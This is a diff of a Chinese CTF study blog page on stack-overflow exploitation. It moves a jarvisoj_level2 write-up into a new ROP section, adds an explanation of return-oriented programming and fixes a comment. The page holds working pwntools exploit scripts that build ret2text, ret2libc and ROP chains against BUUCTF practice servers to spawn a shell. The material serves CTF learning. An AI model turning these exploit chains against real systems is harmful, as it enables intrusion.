@@ -185,7 +185,7 @@
     
     <span class="post-meta mr-2">
       <i class="iconfont icon-chart"></i>
-      5.4k 字
+      5.7k 字
     </span>
   
 
@@ -195,7 +195,7 @@
       <i class="iconfont icon-clock-fill"></i>
       
       
-      63
+      67
        分钟
     </span>
   
@@ -360,30 +360,6 @@
 <figure class="highlight python"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br>host=<span class="hljs-string">&#x27;node4.buuoj.cn&#x27;</span><br>port=<span class="hljs-number">29349</span><br>io=remote(host,port)<br><span class="hljs-comment"># io=process(&#x27;/home/kali/buuctf/pwn1&#x27;)</span><br><br>fun=<span class="hljs-number">0x0000000000401186</span><br>ret = <span class="hljs-number">0x401185</span><br>junk=<span class="hljs-string">b&#x27;a&#x27;</span>*(<span class="hljs-number">15</span>+<span class="hljs-number">8</span>)<br><br>payload=junk+p64(ret)+p64(fun)<br><br>io.sendline(payload)<br>io.interactive()<br></code></pre></div></td></tr></table></figure>
 <p>而且显然如果把payload改成payload=junk+p64(ret)+p64(ret)+p64(ret)+p64(fun)这样，也是可以成功的。因为一个ret是对齐的话，那三个ret自然也是对齐的。感兴趣的可以验证下。</p>
 <p>![Untitled](pwn学习之栈溢出/Untitled 11.png)</p>
-<h3 id="例题2"><a class="markdownIt-Anchor" href="#例题2"></a> 例题2</h3>
-<blockquote>
-<p>平台：buuctf</p>
-<p>题目：jarvisoj_level2</p>
-<p>链接：<a target="_blank" rel="noopener" href="https://buuoj.cn/challenges#jarvisoj_level2">https://buuoj.cn/challenges#jarvisoj_level2</a></p>
-<p>题目特征：没有直接的可以利用的函数，但是代码里存在system函数以及&quot;/bin/sh&quot;字符串，可以通过构造栈来调用</p>
-</blockquote>
-<p>首先查看文件信息，开了不可执行栈，不能构造shellcode，可以栈溢出</p>
-<p>![Untitled](pwn学习之栈溢出/Untitled 41-166738114429865.png)</p>
-<p>再用ida看一下，可以发现漏洞函数很简单，可以看到存在栈溢出</p>
-<p>![Untitled](pwn学习之栈溢出/Untitled 42-166738114429866.png)</p>
-<p>shift+F12打开字符串看一下，可以发现存在“/bin/sh”字符串，那么system和binsh就齐全了，引导控制流到sytem(”/bin/sh”)就行了。</p>
-<p>![Untitled](pwn学习之栈溢出/Untitled 43.png)</p>
-<p>![Untitled](pwn学习之栈溢出/Untitled 44-166738114429867.png)</p>
-<p>exp如下：</p>
-<figure class="highlight python"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br>io=remote(<span class="hljs-string">&#x27;node4.buuoj.cn&#x27;</span>,<span class="hljs-number">27337</span>)<br><span class="hljs-comment"># io=process(&#x27;/home/kali/buuctf/jarvisoj_level2&#x27;)</span><br>bin_sh=<span class="hljs-number">0x0804A024</span><br>system=<span class="hljs-number">0x0804845C</span><br>payload=<span class="hljs-string">b&#x27;a&#x27;</span>*(<span class="hljs-number">0x88</span>+<span class="hljs-number">4</span>)+p32(system)+p32(bin_sh)<br>io.sendline(payload)<br>io.interactive()<br></code></pre></div></td></tr></table></figure>
-<p>但是如果其中system取的是call跳转后的，也就是system实际的地址，这时需要再加一个返回地址，以模拟真实的函数调用过程，如果是call就不用加，因为call会自己将返回地址压栈</p>
-<p>![Untitled](pwn学习之栈溢出/Untitled 45.png)</p>
-<p>exp如下：</p>
-<figure class="highlight python"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br>io=remote(<span class="hljs-string">&#x27;node4.buuoj.cn&#x27;</span>,<span class="hljs-number">27337</span>)<br><span class="hljs-comment"># io=process(&#x27;/home/kali/buuctf/jarvisoj_level2&#x27;)</span><br>bin_sh=<span class="hljs-number">0x0804A024</span><br>system=<span class="hljs-number">0x08048320</span><br>payload=<span class="hljs-string">b&#x27;a&#x27;</span>*(<span class="hljs-number">0x88</span>+<span class="hljs-number">4</span>)+p32(system)+p32(<span class="hljs-number">0</span>)+p32(bin_sh)<br>io.sendline(payload)<br>io.interactive()<br></code></pre></div></td></tr></table></figure>
-<p>这题是32位程序，buuctf上还有一道同样情况的64位程序</p>
-<p>处理方法基本上相同，就是从32位换成了64位，唯一的不同就是32位直接将参数压栈即可，64位的话就是把参数依次放入rdi、rsi、rdx、rcx寄存器中，这里我们调用system函数只有一个参数，所以我们需要一个pop rdi指令，用ROPgadget指令找一下这个指令，然后将binsh作为参数压入rdi中即可。</p>
-<p>![Untitled](pwn学习之栈溢出/Untitled 59.png)</p>
-<figure class="highlight python"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs python"><span class="hljs-keyword">from</span> os <span class="hljs-keyword">import</span> popen<br><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><br>context(os=<span class="hljs-string">&#x27;linux&#x27;</span>, arch=<span class="hljs-string">&#x27;i386&#x27;</span>, log_level=<span class="hljs-string">&#x27;info&#x27;</span>)<br><br>local = <span class="hljs-number">0</span><br><span class="hljs-keyword">if</span> local == <span class="hljs-number">1</span>:<br>    io = process(<span class="hljs-string">&#x27;./jarvisoj_level2_x64&#x27;</span>)<br><br><span class="hljs-keyword">else</span>:<br>    io = remote(<span class="hljs-string">&#x27;node4.buuoj.cn&#x27;</span>,<span class="hljs-number">28765</span>)<br><br>bin_sh=<span class="hljs-number">0x600A90</span><br>system=<span class="hljs-number">0x40063E</span><br>pop_rdi=<span class="hljs-number">0x4006b3</span><br>payload=<span class="hljs-string">b&#x27;a&#x27;</span>*(<span class="hljs-number">0x80</span>+<span class="hljs-number">8</span>)+p64(pop_rdi)+p64(bin_sh)+p64(system)<br>io.sendline(payload)<br>io.interactive()<br></code></pre></div></td></tr></table></figure>
 <h2 id="ret2shellcode"><a class="markdownIt-Anchor" href="#ret2shellcode"></a> ret2shellcode</h2>
 <h3 id="原理-2"><a class="markdownIt-Anchor" href="#原理-2"></a> 原理</h3>
 <p>就是控制程序ret到shellcode的位置，要求shellcode的位置具有可执行权限。</p>
@@ -451,7 +427,7 @@
 <p>![Untitled](pwn学习之栈溢出/Untitled 37.png)</p>
 <p>下面是完整的exp</p>
 <p>其中有两次注入payload，第一次是为了泄露puts函数地址，第二次是为了实施ret2libc攻击</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs nasm">from pwn import *<br>from LibcSearcher import *<br># context(os=&#x27;linux&#x27;, arch=&#x27;amd64&#x27;, log_level=&#x27;debug&#x27;)<br>host=&#x27;node4.buuoj.cn&#x27;<br>port=29417<br>io=remote(host,port)<br># io=process(&#x27;/home/kali/buuctf/ciscn_2019_c_1&#x27;)<br>elf=ELF(&#x27;/home/kali/buuctf/ciscn_2019_c_1&#x27;)<br><br>io.sendlineafter(&#x27;choice!\n&#x27;,&#x27;1&#x27;)<br>offset=0x50<br>junk=b&#x27;\0&#x27;+b&#x27;a&#x27;*(offset-1+8)		#首位填‘\0’,绕过加密，之后填上a覆盖到返回地址<br>main = elf.symbols[&#x27;main&#x27;]          #获取main函数地址<br>puts_plt=elf.plt[&#x27;puts&#x27;]            #获取puts函数plt表中地址<br>puts_got=elf.got[&#x27;puts&#x27;]            #获取puts函数got表中的地址<br>pop_rdi_ret=0x0000000000400c83      #ROPgadget找到的 pop rdi；ret指令地址<br>ret=0x00000000004006b9              #栈平衡，使其对齐0x10<br><br>#首先填入pop rdi ret指令，这正好会将puts_got地址压入rdi中，作为puts函数的参数，这样就可以打印出这个put的真实地址<br>#然后加上main函数的地址，使得打印完后函数控制流回到main开始的地方，重新开始执行一次以便实施攻击<br>payload=junk+p64(pop_rdi_ret)+p64(puts_got)+p64(puts_plt)+p64(main)<br>io.sendlineafter(&#x27;encrypted\n&#x27;,payload)<br>io.recvline()                       #encryp函数在return前还有两行输入，接收掉<br>io.recvline()<br>#获取puts地址，[:-1]过滤掉最后的\n,ljust获取前八字节，不足补\0,u64解包二进制串成int形式<br>puts_addr= u64(io.recvuntil(&#x27;\n&#x27;)[:-1].ljust(8, b&#x27;\0&#x27;))  <br>#hex将一个int数表示成16进制形式<br>print(hex(puts_addr))<br>libc=LibcSearcher(&#x27;puts&#x27;,puts_addr)  #利用LibcSearcher模块找到匹配的libc版本<br>base=puts_addr-libc.dump(&#x27;puts&#x27;)     #获取基址<br>bin_sh=base+libc.dump(&#x27;str_bin_sh&#x27;)  #获取binsh地址<br>system=base+libc.dump(&#x27;system&#x27;)      #获取system函数地址<br><br>io.sendlineafter(&#x27;choice!\n&#x27;,&#x27;1&#x27;) #选择选项1、encrypt<br>#binsh字符串起始地址压入edi，作为system函数的参数，然后调用system函数<br>payload=junk+p64(ret)+p64(pop_rdi_ret)+p64(bin_sh)+p64(system)<br>io.sendlineafter(&#x27;encrypted\n&#x27;,payload)<br>io.interactive()<br></code></pre></div></td></tr></table></figure>
+<figure class="highlight plaintext"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs nasm">from pwn import *<br>from LibcSearcher import *<br># context(os=&#x27;linux&#x27;, arch=&#x27;amd64&#x27;, log_level=&#x27;debug&#x27;)<br>host=&#x27;node4.buuoj.cn&#x27;<br>port=29417<br>io=remote(host,port)<br># io=process(&#x27;/home/kali/buuctf/ciscn_2019_c_1&#x27;)<br>elf=ELF(&#x27;/home/kali/buuctf/ciscn_2019_c_1&#x27;)<br><br>io.sendlineafter(&#x27;choice!\n&#x27;,&#x27;1&#x27;)<br>offset=0x50<br>junk=b&#x27;\0&#x27;+b&#x27;a&#x27;*(offset-1+8)		#首位填‘\0’,绕过加密，之后填上a覆盖到返回地址<br>main = elf.symbols[&#x27;main&#x27;]          #获取main函数地址<br>puts_plt=elf.plt[&#x27;puts&#x27;]            #获取puts函数plt表中地址<br>puts_got=elf.got[&#x27;puts&#x27;]            #获取puts函数got表中的地址<br>pop_rdi_ret=0x0000000000400c83      #ROPgadget找到的 pop rdi；ret指令地址<br>ret=0x00000000004006b9              #栈平衡，使其对齐0x10<br><br>#首先填入pop rdi ret指令，这正好会将puts_got地址压入rdi中，作为puts函数的参数，这样就可以打印出这个put的真实地址<br>#然后加上main函数的地址，使得打印完后函数控制流回到main开始的地方，重新开始执行一次以便实施攻击<br>payload=junk+p64(pop_rdi_ret)+p64(puts_got)+p64(puts_plt)+p64(main)<br>io.sendlineafter(&#x27;encrypted\n&#x27;,payload)<br>io.recvline()                       #encryp函数在return前还有两行输入，接收掉<br>io.recvline()<br>#获取puts地址，[:-1]过滤掉最后的\n,ljust获取前八字节，不足补\0,u64解包二进制串成int形式<br>puts_addr= u64(io.recvuntil(&#x27;\n&#x27;)[:-1].ljust(8, b&#x27;\0&#x27;))  <br>#hex将一个int数表示成16进制形式<br>print(hex(puts_addr))<br>libc=LibcSearcher(&#x27;puts&#x27;,puts_addr)  #利用LibcSearcher模块找到匹配的libc版本<br>base=puts_addr-libc.dump(&#x27;puts&#x27;)     #获取基址<br>bin_sh=base+libc.dump(&#x27;str_bin_sh&#x27;)  #获取binsh地址<br>system=base+libc.dump(&#x27;system&#x27;)      #获取system函数地址<br><br>io.sendlineafter(&#x27;choice!\n&#x27;,&#x27;1&#x27;) #选择选项1、encrypt<br>#binsh字符串起始地址压入rdi，作为system函数的参数，然后调用system函数<br>payload=junk+p64(ret)+p64(pop_rdi_ret)+p64(bin_sh)+p64(system)<br>io.sendlineafter(&#x27;encrypted\n&#x27;,payload)<br>io.interactive()<br></code></pre></div></td></tr></table></figure>
 <p>当时在kali上做的时候，本机一直跑不通，远程成功了，两次找到的puts地址也不相同，后来问了大佬才知道是libcsearcher找不到kali上的libc版本，导致失败了。做pwn题最好还是在ubuntu上，毕竟远程环境大多是ubuntu，所以打算转回ubuntu了。</p>
 <h2 id="ret2dl_resolve"><a class="markdownIt-Anchor" href="#ret2dl_resolve"></a> ret2dl_resolve</h2>
 <h2 id="ret2vdso"><a class="markdownIt-Anchor" href="#ret2vdso"></a> ret2VDSO</h2>
@@ -460,6 +436,37 @@
 <h2 id="leak-pie"><a class="markdownIt-Anchor" href="#leak-pie"></a> leak pie</h2>
 <h2 id="leak-canary"><a class="markdownIt-Anchor" href="#leak-canary"></a> leak canary</h2>
 <h2 id="rop"><a class="markdownIt-Anchor" href="#rop"></a> ROP</h2>
+<h3 id="原理-4"><a class="markdownIt-Anchor" href="#原理-4"></a> 原理</h3>
+<p>在ret2text中，程序直接提供了可以利用的攻击函数，直接将返回地址设置为这个函数的入口地址就可以执行。</p>
+<p>在ret2shellcode中，可以在栈上注入shellcode来执行目标代码</p>
+<p>后来，因为程序开启了NX保护机制，再执行注入的shellcode就会报错，既然注入新代码不可行，那么就复用程序中已有的代码。libc.so几乎在每个程序执行时都会加载，攻击者就开始考虑利用libc中的函数，这种技术就是ret2libc，我们在上一节已经讲过。但是这种技术也有缺陷，首先，虽然攻击者可以一个接一个地调用libc中的函数，但这个执行流仍然是线性的，而不像代码注入那样任意执行，其次，攻击者只能使用程序text段和libc中已有的函数，通过移除这些特定的函数就可以限制此类攻击。</p>
+<p>所以就出现了ROP（Return Oriented Programming）攻击。ROP 的主要思想就是攻击者不需要自己注入代码（因为在 NX 的保护下，注入的代码不可执行），而是利用系统已有的代码片段来构造攻击。这里之所以叫 ROP，是因为其改变控制流的方式是用系统中的 return 指令（比如 x86 中的 ret）。</p>
+<p>可以通过ROPgadget工具来查找具体需要的指令，具体使用</p>
+<h3 id="例题-3"><a class="markdownIt-Anchor" href="#例题-3"></a> 例题</h3>
+<blockquote>
+<p>平台：buuctf</p>
+<p>题目：jarvisoj_level2</p>
+<p>链接：<a target="_blank" rel="noopener" href="https://buuoj.cn/challenges#jarvisoj_level2">https://buuoj.cn/challenges#jarvisoj_level2</a></p>
+<p>题目特征：没有直接的可以利用的函数，但是代码里存在system函数以及&quot;/bin/sh&quot;字符串，可以通过构造栈来完成简单的ROP攻击</p>
+</blockquote>
+<p>首先查看文件信息，开了不可执行栈，不能构造shellcode，可以栈溢出</p>
+<p>![Untitled](pwn学习之栈溢出/Untitled 41-166738114429865.png)</p>
+<p>再用ida看一下，可以发现漏洞函数很简单，可以看到存在栈溢出</p>
+<p>![Untitled](pwn学习之栈溢出/Untitled 42-166738114429866.png)</p>
+<p>shift+F12打开字符串看一下，可以发现存在“/bin/sh”字符串，那么system和binsh就齐全了，引导控制流到sytem(”/bin/sh”)就行了。</p>
+<p>![Untitled](pwn学习之栈溢出/Untitled 43.png)</p>
+<p>![Untitled](pwn学习之栈溢出/Untitled 44-166738114429867.png)</p>
+<p>exp如下：</p>
+<figure class="highlight python"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br>io=remote(<span class="hljs-string">&#x27;node4.buuoj.cn&#x27;</span>,<span class="hljs-number">27337</span>)<br><span class="hljs-comment"># io=process(&#x27;/home/kali/buuctf/jarvisoj_level2&#x27;)</span><br>bin_sh=<span class="hljs-number">0x0804A024</span><br>system=<span class="hljs-number">0x0804845C</span><br>payload=<span class="hljs-string">b&#x27;a&#x27;</span>*(<span class="hljs-number">0x88</span>+<span class="hljs-number">4</span>)+p32(system)+p32(bin_sh)<br>io.sendline(payload)<br>io.interactive()<br></code></pre></div></td></tr></table></figure>
+<p>但是如果其中system取的是call跳转后的，也就是system实际的地址，这时需要再加一个返回地址，以模拟真实的函数调用过程，如果是call就不用加，因为call会自己将返回地址压栈</p>
+<p>![Untitled](pwn学习之栈溢出/Untitled 45.png)</p>
+<p>exp如下：</p>
+<figure class="highlight python"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br>io=remote(<span class="hljs-string">&#x27;node4.buuoj.cn&#x27;</span>,<span class="hljs-number">27337</span>)<br><span class="hljs-comment"># io=process(&#x27;/home/kali/buuctf/jarvisoj_level2&#x27;)</span><br>bin_sh=<span class="hljs-number">0x0804A024</span><br>system=<span class="hljs-number">0x08048320</span><br>payload=<span class="hljs-string">b&#x27;a&#x27;</span>*(<span class="hljs-number">0x88</span>+<span class="hljs-number">4</span>)+p32(system)+p32(<span class="hljs-number">0</span>)+p32(bin_sh)<br>io.sendline(payload)<br>io.interactive()<br></code></pre></div></td></tr></table></figure>
+<p>这题是32位程序，buuctf上还有一道同样情况的64位程序</p>
+<p>处理方法基本上相同，就是从32位换成了64位，唯一的不同就是32位直接将参数压栈即可，64位的话就是把参数依次放入rdi、rsi、rdx、rcx寄存器中，这里我们调用system函数只有一个参数，所以我们需要一个pop rdi指令，用ROPgadget指令找一下这个指令，然后将binsh作为参数压入rdi中即可。</p>
+<p>![Untitled](pwn学习之栈溢出/Untitled 59.png)</p>
+<figure class="highlight python"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs python"><span class="hljs-keyword">from</span> os <span class="hljs-keyword">import</span> popen<br><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><br>context(os=<span class="hljs-string">&#x27;linux&#x27;</span>, arch=<span class="hljs-string">&#x27;i386&#x27;</span>, log_level=<span class="hljs-string">&#x27;info&#x27;</span>)<br><br>local = <span class="hljs-number">0</span><br><span class="hljs-keyword">if</span> local == <span class="hljs-number">1</span>:<br>    io = process(<span class="hljs-string">&#x27;./jarvisoj_level2_x64&#x27;</span>)<br><br><span class="hljs-keyword">else</span>:<br>    io = remote(<span class="hljs-string">&#x27;node4.buuoj.cn&#x27;</span>,<span class="hljs-number">28765</span>)<br><br>bin_sh=<span class="hljs-number">0x600A90</span><br>system=<span class="hljs-number">0x40063E</span><br>pop_rdi=<span class="hljs-number">0x4006b3</span><br>payload=<span class="hljs-string">b&#x27;a&#x27;</span>*(<span class="hljs-number">0x80</span>+<span class="hljs-number">8</span>)+p64(pop_rdi)+p64(bin_sh)+p64(system)<br>io.sendline(payload)<br>io.interactive()<br></code></pre></div></td></tr></table></figure>
+<h2 id><a class="markdownIt-Anchor" href="#"></a> </h2>
 <h2 id="srop"><a class="markdownIt-Anchor" href="#srop"></a> SROP</h2>
 <h2 id="brop"><a class="markdownIt-Anchor" href="#brop"></a> BROP</h2>
 
@@ -501,6 +508,12 @@
                 <div class="post-prevnext">
                   <article class="post-prev col-6">
                     
+                    
+                      <a href="/posts/0/">
+                        <i class="iconfont icon-arrowleft"></i>
+                        <span class="hidden-mobile"></span>
+                        <span class="visible-mobile">上一篇</span>
+                      </a>
                     
                   </article>
                   <article class="post-next col-6">
